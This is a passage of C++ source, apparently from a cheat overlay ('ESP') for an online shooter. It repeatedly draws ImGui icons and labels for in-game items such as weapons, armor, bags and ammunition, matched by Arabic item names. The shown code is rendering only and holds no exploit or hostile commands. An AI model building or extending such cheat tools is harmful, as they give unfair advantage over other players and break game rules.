													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Benzin_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Benzin_Color[0], Setting::Esp_Item_Benzin_Color[1], Setting::Esp_Item_Benzin_Color[2], Setting::Esp_Item_Benzin_Color[3]), true);
													continue;

												}
												if (Setting::Esp_Item_Dagger && Item.Name == u8"ﺔﻨﻴﻜﺳ")
												{
													if (Setting::Esp_Item_Dagger_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Dagger, Screen.X - 50, Screen.Y - 25, 40, 40);
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Dagger, Screen.X - 50, Screen.Y - 25, 40, 40);
														}
													}
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Dagger_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Dagger_Color[0], Setting::Esp_Item_Dagger_Color[1], Setting::Esp_Item_Dagger_Color[2], Setting::Esp_Item_Dagger_Color[3]), true);
													continue;

												}
												if (Setting::Esp_Item_ZombieBlade && Item.Name == u8"Zombie Blade")
												{
													if (Setting::Esp_Item_ZombieBlade_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::ZombieBlade, Screen.X - 50, Screen.Y - 25, 40, 40);
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::ZombieBlade, Screen.X - 50, Screen.Y - 25, 40, 40);
														}
													}
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_ZombieBlade_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_ZombieBlade_Color[0], Setting::Esp_Item_ZombieBlade_Color[1], Setting::Esp_Item_ZombieBlade_Color[2], Setting::Esp_Item_ZombieBlade_Color[3]), true);
													continue;

												}
												if (Setting::Esp_Item_ZombieHammer && Item.Name == u8"Zombie Hammer")
												{
													if (Setting::Esp_Item_GameCoin_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::ZombieHammer, Screen.X - 50, Screen.Y - 25, 40, 40);
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::ZombieHammer, Screen.X - 50, Screen.Y - 25, 40, 40);
														}
													}
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_ZombieHammer_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_ZombieHammer_Color[0], Setting::Esp_Item_ZombieHammer_Color[1], Setting::Esp_Item_ZombieHammer_Color[2], Setting::Esp_Item_ZombieHammer_Color[3]), true);
													continue;

												}
												if (Setting::Esp_Item_Bag1 && Item.Name == u8"1 ﻞﻔﻟ ﺔﻄﻨﺷ")
												{
													if (Setting::Esp_Item_Bag1_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::BagV1, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::BagV1, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
													}
													//	else
													//	{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Bag1_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Bag1_Color[0], Setting::Esp_Item_Bag1_Color[1], Setting::Esp_Item_Bag1_Color[2], Setting::Esp_Item_Bag1_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Bag2 && Item.Name == u8"2 ﻞﻔﻟ ﺔﻄﻨﺷ")
												{
													if (Setting::Esp_Item_Bag2_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::BagV2, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::BagV2, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Bag2_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Bag2_Color[0], Setting::Esp_Item_Bag2_Color[1], Setting::Esp_Item_Bag2_Color[2], Setting::Esp_Item_Bag2_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Helmet1 && Item.Name == u8" 1ﻞﻔﻟ ﺓﺫﻮﺧ")
												{
													if (Setting::Esp_Item_Helmet1_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::HelmetV2, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::HelmetV2, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Helmet1_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Helmet1_Color[0], Setting::Esp_Item_Helmet1_Color[1], Setting::Esp_Item_Helmet1_Color[2], Setting::Esp_Item_Helmet1_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Helmet2 && Item.Name == u8"2 ﻞﻔﻟ ﺓﺫﻮﺧ")
												{
													if (Setting::Esp_Item_Helmet2_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::HelmetV1, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::HelmetV1, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Helmet2_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Helmet2_Color[0], Setting::Esp_Item_Helmet2_Color[1], Setting::Esp_Item_Helmet2_Color[2], Setting::Esp_Item_Helmet2_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Armor1 && Item.Name == u8"1 ﻞﻔﻟ ﻉﺭﺩ 1")
												{
													if (Setting::Esp_Item_Armor1_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::VestV1, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::VestV1, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
													}
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Armor1_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Armor1_Color[0], Setting::Esp_Item_Armor1_Color[1], Setting::Esp_Item_Armor1_Color[2], Setting::Esp_Item_Armor1_Color[3]), true);
													continue;
												}
												if (Setting::Esp_Item_Armor2 && Item.Name == u8" 2ﻞﻔﻟ ﻉﺭﺩ")
												{
													if (Setting::Esp_Item_Armor2_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::VestV2, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::VestV2, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
													}

													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Normalfontsize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Armor2_Color[0], Setting::Esp_Item_Armor2_Color[1], Setting::Esp_Item_Armor2_Color[2], Setting::Esp_Item_Armor2_Color[3]), true);
													continue;
												}
												if (Setting::Esp_Item_Mk47Mutant && Item.Name == u8"47ﻲﻛ ﻡﺍ")
												{
													if (Setting::Esp_Item_Mk47Mutant_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Mk47, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Mk47, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Mk47Mutant_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Mk47Mutant_Color[0], Setting::Esp_Item_Mk47Mutant_Color[1], Setting::Esp_Item_Mk47Mutant_Color[2], Setting::Esp_Item_Mk47Mutant_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_M16A4 && Item.Name == u8"16 ﻡﺍ")
												{
													if (Setting::Esp_Item_M16A4_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::M16A4, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::M16A4, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_M16A4_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_M16A4_Color[0], Setting::Esp_Item_M16A4_Color[1], Setting::Esp_Item_M16A4_Color[2], Setting::Esp_Item_M16A4_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_G36C && Item.Name == u8"ﻲﺳ 36 ﻲﺟ")
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_G36C_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_G36C_Color[0], Setting::Esp_Item_G36C_Color[1], Setting::Esp_Item_G36C_Color[2], Setting::Esp_Item_G36C_Color[3]), true);
													continue;
												}
												if (Setting::Esp_Item_QBZ && Item.Name == u8"ﺩﺯ ﻲﺑ ﻮﻴﻛ")
												{
													if (Setting::Esp_Item_QBZ_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::QBZ, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::QBZ, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
														//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_QBZ_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_QBZ_Color[0], Setting::Esp_Item_QBZ_Color[1], Setting::Esp_Item_QBZ_Color[2], Setting::Esp_Item_QBZ_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_AUG && Item.Name == u8"ﻲﺟ ﻮﻳ ﻱﺍ")
												{
													if (Setting::Esp_Item_AUG_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::AUG, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::AUG, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
														//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_AUG_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_QBZ_Color[0], Setting::Esp_Item_QBZ_Color[1], Setting::Esp_Item_QBZ_Color[2], Setting::Esp_Item_QBZ_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_QBU && Item.Name == u8"ﻮﻳ ﻲﺑ ﻮﻴﻛ")
												{
													if (Setting::Esp_Item_QBU_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::QBU, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::QBU, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_QBU_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_QBU_Color[0], Setting::Esp_Item_QBU_Color[1], Setting::Esp_Item_QBU_Color[2], Setting::Esp_Item_QBU_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_SLR && Item.Name == u8"ﺭﺍ ﻝﺍ ﺱﺍ")
												{
													if (Setting::Esp_Item_SLR_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SLR, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SLR, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
														//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_SLR_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_SLR_Color[0], Setting::Esp_Item_SLR_Color[1], Setting::Esp_Item_SLR_Color[2], Setting::Esp_Item_SLR_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Mini14 && Item.Name == u8"14 ﻲﻨﻴﻣ")
												{
													if (Setting::Esp_Item_Mini14_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Mini14, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Mini14, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
														//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Mini14_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Mini14_Color[0], Setting::Esp_Item_Mini14_Color[1], Setting::Esp_Item_Mini14_Color[2], Setting::Esp_Item_Mini14_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_SKS && Item.Name == u8"ﺱﺍ ﻲﻛ ﺱﺍ")
												{
													if (Setting::Esp_Item_SKS_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SKS, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SKS, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//	else
														//	{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_SKS_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_SKS_Color[0], Setting::Esp_Item_SKS_Color[1], Setting::Esp_Item_SKS_Color[2], Setting::Esp_Item_SKS_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_PP19 && Item.Name == u8"19 ﻲﺑ ﻲﺑ")
												{
													if (Setting::Esp_Item_PP19_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::PP19, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::PP19, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//	else
														//	{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_PP19_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_PP19_Color[0], Setting::Esp_Item_PP19_Color[1], Setting::Esp_Item_PP19_Color[2], Setting::Esp_Item_PP19_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_P90 && Item.Name == u8"90 ﻲﺑ")
												{
													if (Setting::Esp_Item_P90_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::P90, Screen.X - 50, Screen.Y - 25, 40, 40);
															continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::P90, Screen.X - 50, Screen.Y - 25, 40, 40);
															continue;
														}
													}
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_P90_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_P90_Color[0], Setting::Esp_Item_P90_Color[1], Setting::Esp_Item_P90_Color[2], Setting::Esp_Item_P90_Color[3]), true);
													continue;
												}
												if (Setting::Esp_Item_MG3 && Item.Name == u8"3ﻲﺟ ﻡﺍ")
												{
													if (Setting::Esp_Item_MG3_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::MG3, Screen.X - 50, Screen.Y - 25, 40, 40);
															continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::MG3, Screen.X - 50, Screen.Y - 25, 40, 40);
															continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_MG3_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_MG3_Color[0], Setting::Esp_Item_MG3_Color[1], Setting::Esp_Item_MG3_Color[2], Setting::Esp_Item_MG3_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_HoneyBadger && Item.Name == u8"ﺮﺟﺪﺑ ﻲﻧﺎﻫ")
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Normalfontsize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_PP19_Color[0], Setting::Esp_Item_PP19_Color[1], Setting::Esp_Item_PP19_Color[2], Setting::Esp_Item_PP19_Color[3]), true);
													continue;
												}
												if (Setting::Esp_Item_FAMAS && Item.Name == u8"ﺱﺎﻣﺎﻓ")
												{
													if (Setting::Esp_Item_FAMAS_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::FAMAS, Screen.X - 50, Screen.Y - 25, 40, 40);
															continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::FAMAS, Screen.X - 50, Screen.Y - 25, 40, 40);
															continue;
														}
													}
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Normalfontsize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_PP19_Color[0], Setting::Esp_Item_PP19_Color[1], Setting::Esp_Item_PP19_Color[2], Setting::Esp_Item_PP19_Color[3]), true);
													continue;
												}
												if (Setting::Esp_Item_Mosin && Item.Name == u8"ﻦﻴﺳﻮﻣ")
												{
													if (Setting::Esp_Item_Mosin_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Kar98, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Kar98, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
														//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Mosin_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Mosin_Color[0], Setting::Esp_Item_Mosin_Color[1], Setting::Esp_Item_Mosin_Color[2], Setting::Esp_Item_Mosin_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_TommyGun && Item.Name == u8"ﻦﺟ ﻲﻣﻮﺗ")
												{
													if (Setting::Esp_Item_TommyGun_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::TommyGun, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::TommyGun, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//	else
														//	{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_FAMAS_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_FAMAS_Color[0], Setting::Esp_Item_FAMAS_Color[1], Setting::Esp_Item_FAMAS_Color[2], Setting::Esp_Item_FAMAS_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_MP5K && Item.Name == u8"ﻲﻛ 5 ﻲﺑ ﻡﺍ")
												{
													if (Setting::Esp_Item_MP5K_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::MP5K, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::MP5K, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//	else
														//	{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_MP5K_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_MP5K_Color[0], Setting::Esp_Item_MP5K_Color[1], Setting::Esp_Item_MP5K_Color[2], Setting::Esp_Item_MP5K_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_UMP9 && Item.Name == u8"ﻲﺑ ﻡﺍ ﻮﻳ")
												{
													if (Setting::Esp_Item_UMP9_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::UMP9, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::UMP9, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//	else
												//	{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_UMP9_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_UMP9_Color[0], Setting::Esp_Item_UMP9_Color[1], Setting::Esp_Item_UMP9_Color[2], Setting::Esp_Item_UMP9_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Vector && Item.Name == u8"ﺭﻮﺘﻜﻴﻓ")
												{
													if (Setting::Esp_Item_Vector_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Vector, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Vector, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
														//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Vector_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Vector_Color[0], Setting::Esp_Item_Vector_Color[1], Setting::Esp_Item_Vector_Color[2], Setting::Esp_Item_Vector_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Uzi && Item.Name == u8"ﻱﺯﻭﺍ")
												{
													if (Setting::Esp_Item_Uzi_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Uzi, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Uzi, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
														//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Uzi_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Uzi_Color[0], Setting::Esp_Item_Uzi_Color[1], Setting::Esp_Item_Uzi_Color[2], Setting::Esp_Item_Uzi_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_762mm && Item.Name == u8"7.62 ﻖﻠﻃ")
												{
													if (Setting::Esp_Item_762mm_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
